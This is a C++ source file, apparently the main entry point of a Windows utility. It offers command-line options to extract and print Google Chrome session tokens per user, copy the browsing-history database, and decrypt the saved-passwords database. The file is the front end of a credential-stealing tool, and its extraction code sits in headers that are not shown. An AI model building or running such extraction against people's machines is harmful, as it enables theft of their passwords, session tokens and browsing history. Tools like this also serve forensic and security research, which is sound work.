#include "windows/WindowsGoogleDbExtractor.h"
#include "utils/decrypt/AesGCMDecryptor.h"
#include "boost/program_options.hpp"

namespace
{
    void InitLoger()
    {
        // Set the default logger to file logger
        std::filesystem::create_directory("logs");
        spdlog::set_level(spdlog::level::trace); // Set global log level to debug
        auto file_logger = spdlog::basic_logger_mt("logger", "logs/log.txt");
        spdlog::set_default_logger(file_logger);
    }

    void Menu(int ac, char** av)
    {
        google::WindowsGoogleDbExtractor tokenExtractor;
        boost::program_options::options_description cmdOptions {"Util options"};
        std::string task_type;
        cmdOptions.add_options()
                ("help,h", "Show help")
                ("tokens,t", "Extract Google Chrome tokens")
                ("history,h", "Extract Google Chrome History database")
                ("passwords,p", "Extract Google Chrome decrypted passwords database")
                ("all,a", "Extract all Google Chrome artifacts");

        boost::program_options::variables_map vm;

        try
        {
            boost::program_options::parsed_options parsed
                    = boost::program_options::command_line_parser(ac, av).options(cmdOptions).allow_unregistered().run();
            boost::program_options::store(parsed, vm);
            boost::program_options::notify(vm);

            if (vm.count("help"))
            {
                std::cout << cmdOptions << "\n";
            }
            if (vm.count("tokens"))
            {
                std::map<std::string, std::vector<unsigned char>> tokens;
                tokenExtractor.ExtractTokens(tokens);
                for (auto [user, token] : tokens)
                {
                    std::cout << "User: " << user << "\n";
                    std::cout << "Token: " << std::string(token.begin(), token.end()) << "\n";
                }
            }
            if (vm.count("history"))
            {
                tokenExtractor.CopyHistoryDb();
            }
            if (vm.count("passwords"))
            {
                tokenExtractor.DecryptPasswordsDb();

            }
            if (vm.count("all"))
            {
                //extract all databases
            }
        }
        catch(std::exception& ex)
        {
            std::cout << cmdOptions << std::endl;
            spdlog::error(ex.what());
        }
    }
}

int main(int argc, char** argv)
{
    InitLoger();
//    google::WindowsGoogleDbExtractor winExtractor;
//    std::map<std::string, crypt::RawVector> tokens;
//    winExtractor.DecryptPasswordsDb();
    Menu(argc, argv);
    //    winExtractor.CopyGoogleChromeFullDirWithKey();
    return 0;
}

